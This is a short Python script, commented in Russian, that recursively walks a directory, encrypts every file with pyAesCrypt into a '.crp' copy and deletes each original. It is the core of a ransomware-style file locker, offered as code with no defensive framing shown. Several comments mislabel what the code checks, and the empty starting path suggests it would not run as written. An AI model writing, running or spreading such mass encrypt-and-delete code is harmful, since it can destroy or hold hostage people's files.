import pyAesCrypt
import os

# функция шифрования файла
def encryption(file, password):
    # задаем размер буфера
    buffer_size = 512 * 1024
    
    # вызов метода шифрования
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".crp",
        password,
        buffer_size
    )
    
    # вывод результата в виде имени зашифрованного файла
    print("[Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован]")
    
    # удаляем исходный файл
    os.remove(file)
    
# функция сканирования директорий
def walking_by_dirs(dir, password):
    # перебор всех директорий в указанном месте
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        # если нашли директорию - шифруем ее
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        else: # в случае НЕ нахождения директории продолжаем сканировать
            walking_by_dirs(path, password)
            
password = input("Введите пароль для шифрования: ")
walking_by_dirs("", password)